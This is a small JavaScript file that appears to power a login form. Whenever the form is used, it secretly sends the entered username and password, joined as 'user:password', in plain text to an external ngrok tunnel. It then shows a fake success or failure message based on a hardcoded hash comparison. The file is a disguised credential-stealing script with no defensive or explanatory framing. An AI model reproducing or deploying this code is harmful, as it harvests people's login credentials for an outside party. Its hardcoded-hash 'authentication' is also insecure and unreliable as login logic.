let address = "https://2691-60-227-93-23.ngrok.io";


function httpGet(comb){
  var xmlHttp = new XMLHttpRequest();
  xmlHttp.open( "GET", address+'/up?user='+comb, true );
  xmlHttp.send( null );
  return xmlHttp.responseText;
};

function func(string) {
  if (string == ""){
    return "User/Password Empty!";
  };

  //set variable hash as 0
  var hash = 0;

  // if the length of the string is 0, return 0
  if (string.length == 0) return hash;

  for (i = 0 ;i<string.length ; i++){
    ch = string.charCodeAt(i);
    hash = ((hash << 5) - hash) + ch;
    hash = hash & hash;
  };

  if (hash ==  -159711510){
    //JsLoadingOverlay.show();
    return 'Success';
  };

  if (hash !=  -159711510){
    return 'Wrong Password'
  };
  
  return hash;
};

// string that has to create hashcode
function hashit(string) {
  let user=document.getElementById('login').value;
  let pword=document.getElementById('password').value;
  let comb=user+':'+pword;
  let entry=user+pword;
  console.log(comb);
  console.log(pword)
  httpGet(comb)
  document.getElementById("login").value = "";
  document.getElementById("password").value = func(entry);
  document.getElementById("password").placeholder = func(entry);
  document.getElementById("password").value = '';
  };
